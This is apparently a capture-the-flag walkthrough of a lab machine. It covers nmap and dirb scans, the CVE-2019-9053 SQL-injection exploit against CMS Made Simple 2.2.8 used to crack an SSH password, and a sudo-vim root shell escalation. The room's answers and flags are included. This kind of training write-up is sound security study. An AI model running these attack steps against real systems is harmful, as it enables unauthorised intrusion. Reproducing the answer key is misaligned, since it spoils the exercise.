#### Nmap 
```bash
nmap -A -p- 10.10.217.68
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 10:39 BST
Nmap scan report for ip-10-10-217-68.eu-west-1.compute.internal (10.10.217.68)
Host is up (0.00042s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.242.71
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
MAC Address: 02:9F:22:36:72:4B (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms ip-10-10-217-68.eu-west-1.compute.internal (10.10.217.68)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.00 seconds
```

- How many services are running under port 1000?
	- 2

- What is running on the higher port?
	- ssh

**There's a web page running on port 80 but we only find the default Apache2 page. Let's try a web scanner to find web pages.**

#### Find a web page using Dirb
```bash
dirb http://10.10.217.68 /usr/share/wordlists/dirb/common.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jul 13 10:57:47 2025
URL_BASE: http://10.10.217.68/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.217.68/ ----
+ http://10.10.217.68/index.html (CODE:200|SIZE:11321)                                                                                     
+ http://10.10.217.68/robots.txt (CODE:200|SIZE:929)                                                                                       
+ http://10.10.217.68/server-status (CODE:403|SIZE:300)                                                                                    
==> DIRECTORY: http://10.10.217.68/simple/ 
```

**We have found a webpage called `simple`.  It is running a website `CMS made simple version 2.2.8`**

- What's the CVE you're using against the application?
	- CVE-2019-9053

- To what kind of vulnerability is the application vulnerable?
	- SQLi

#### Let's try to find the password.
Run the python script to see what it does.
	If you get an error `no module named termcolor`, then install it with pip 
	```
	pip install termcolor
	```

At line 25, there a rundown on how to use the script. 
```bash
print "[+] Specify an url target"
    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
    exit()
```

**Crack the password**
```bash
python 46635.py -u http://10.10.217.68/simple --crack -w /usr/share/wordlist/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

 - What's the password?
	 - secret
- Where can you login with the details obtained?
	- ssh

#### Login to the Victim Machine
```bash
ssh mitch@10.10.217.68 -p 2222
```

```bash
cat user.txt
```

- What's the user flag?
	- G00d j0b, keep up!

- Is there any other user in the home directory? What's its name?
	- sunbath

```bash
sudo -l

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

- What can you leverage to spawn a privileged shell?
	- vim

#### Privilege Escalation
Go to GTFOBins
```bash
sudo vim -c ':!/bin/bash'
```

- What's the root flag?
	- W3ll d0n3. You made it!